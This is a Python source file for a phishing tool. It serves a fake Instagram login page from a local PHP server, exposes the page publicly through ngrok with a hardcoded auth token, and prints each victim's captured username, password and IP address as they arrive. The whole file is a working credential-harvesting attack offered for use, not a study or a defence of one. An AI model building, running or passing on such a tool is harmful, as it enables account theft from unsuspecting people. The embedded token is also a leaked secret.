import json
from subprocess import *
import time
from colorama import Fore
from pyngrok import ngrok
import sys
import os
from Module import Help



a = open("../Fake-page/site/insta-org/usernames.json","w")
b = a.write("")
a.close

i = open("../Fake-page/site/insta-org/ip.txt","w")
o = i.write("")
i.close

sf = 0

def main():

    if os.name == "nt":
        token = "1y5bbvVnbVOgfEKe6KQnb3cH2DY_3cJEWHtuB3JNcJSZNEqsc"
        from winsound import Beep

        Help.Banner()

        def server():
            with open("server.log","w") as phplog:
                Popen(("php","-S","localhost:1111","-t","../Fake-page/site/insta-org"),stdout=phplog,stderr=phplog)
        
        server()
        link = ngrok.connect(1111,"http",auth_token=token)
        print(f"{Fore.LIGHTRED_EX}[*] {Fore.LIGHTCYAN_EX}Your link address is valid for 40 minutes!")
        print(f"{Fore.LIGHTRED_EX}[*] {Fore.LIGHTCYAN_EX}It is possible to connect 4 people!")
        print(f"{Fore.BLUE}Your Link Address: {Fore.RED}{link}")

        def user():
            global sf
            if not str(os.stat("../Fake-page/site/insta-org/usernames.json").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/insta-org/usernames.json").st_size)
                file = open("../Fake-page/site/insta-org/usernames.json","r")
                rfile = file.read()
                try:
                    info = json.loads(rfile)
                    for value in info["dev"]:
                        Beep(600,400)
                        print(f"{Fore.GREEN}[+]{Fore.RED} Username ={Fore.YELLOW} {value['username']}")
                        print(f"{Fore.GREEN}[+]{Fore.RED} Password ={Fore.YELLOW} {value['password']}")
                        a = open("../Fake-page/site/insta-org/usernames.json","w")
                        b = a.write("")
                        a.close
                except:
                    print("")


        def ip():
            global sf
            if not str(os.stat("../Fake-page/site/insta-org/ip.txt").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/insta-org/ip.txt").st_size)
                ipfile= open("../Fake-page/site/insta-org/ip.txt","r")
                ripfile= ipfile.readline()
                try:
                    ripfile = ripfile[-1]
                    print(f"{Fore.GREEN}[!]{Fore.LIGHTCYAN_EX} ip person entered = [{ripfile}]{Fore.LIGHTYELLOW_EX} at {Fore.MAGENTA}[{time.ctime()}]")
                    i = open("../Fake-page/site/insta-org/ip.txt","w")
                    o = i.write("")
                    i.close
                except:
                    print("")

        while True:
            ip()
            user()        
    elif os.name == "posix":
        token = "1y5bbvVnbVOgfEKe6KQnb3cH2DY_3cJEWHtuB3JNcJSZNEqsc"

        Help.Banner()

        def server():
            with open("server.log","w") as phplog:
                Popen(("php","-S","localhost:1111","-t","../Fake-page/site/insta-org"),stdout=phplog,stderr=phplog)
        
        server()
        link = ngrok.connect(1111,"http",auth_token=token)
        print(f"{Fore.LIGHTRED_EX}[*] {Fore.LIGHTCYAN_EX}Your link address is valid for 40 minutes!")
        print(f"{Fore.LIGHTRED_EX}[*] {Fore.LIGHTCYAN_EX}It is possible to connect 4 people!")
        print(f"{Fore.BLUE}Your Link Address: {Fore.RED}{link}")

        def user():
            global sf
            if not str(os.stat("../Fake-page/site/insta-org/usernames.json").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/insta-org/usernames.json").st_size)
                file = open("../Fake-page/site/insta-org/usernames.json","r")
                rfile = file.read()
                try:
                    info = json.loads(rfile)
                    for value in info["dev"]:
                        print(f"{Fore.GREEN}[+]{Fore.RED} Username ={Fore.YELLOW} {value['username']}")
                        print(f"{Fore.GREEN}[+]{Fore.RED} Password ={Fore.YELLOW} {value['password']}")
                        a = open("../Fake-page/site/insta-org/usernames.json","w")
                        b = a.write("")
                        a.close
                except:
                    print("")


        def ip():
            global sf
            if not str(os.stat("../Fake-page/site/insta-org/ip.txt").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/insta-org/ip.txt").st_size)
                ipfile= open("../Fake-page/site/insta-org/ip.txt","r")
                ripfile= ipfile.readline()
                try:
                    ripfile = ripfile[-1]
                    print(f"{Fore.GREEN}[!]{Fore.LIGHTCYAN_EX} ip person entered = [{ripfile}]{Fore.LIGHTYELLOW_EX} at {Fore.MAGENTA}[{time.ctime()}]")
                    i = open("../Fake-page/site/insta-org/ip.txt","w")
                    o = i.write("")
                    i.close
                except:
                    print("")

        while True:
            ip()
            user()        
        


        

